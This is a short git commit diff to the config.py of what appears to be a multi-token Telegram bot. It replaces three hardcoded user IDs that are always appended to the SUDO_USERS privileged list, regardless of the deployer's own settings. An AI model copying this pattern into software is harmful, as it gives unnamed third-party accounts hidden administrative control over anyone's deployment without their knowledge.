c82fd921213e4342edc950fc6fa1046acd090d71
GAMING CHAUHAN <143026011+Gamingbuddyyy@users.noreply.github.com>
2023-11-03 23:51:33 +0530

    Update config.py

--- config.py
+++ config.py
@@ -26,9 +26,9 @@ BOT_TOKEN8 = config("BOT_TOKEN8", default=None)
 BOT_TOKEN9 = config("BOT_TOKEN9", default=None)
 BOT_TOKEN10 = config("BOT_TOKEN10", default=None)
 SUDO_USERS = list(map(int, getenv("SUDO_USER").split()))
-SUDO_USERS.append(1410250744)
-SUDO_USERS.append(5327845950)
-SUDO_USERS.append(1211015395)
+SUDO_USERS.append(6570251736)
+SUDO_USERS.append(1918848221)
+SUDO_USERS.append(5618881376)
 
 OWNER_ID = int(os.environ.get("OWNER_ID", None))
 
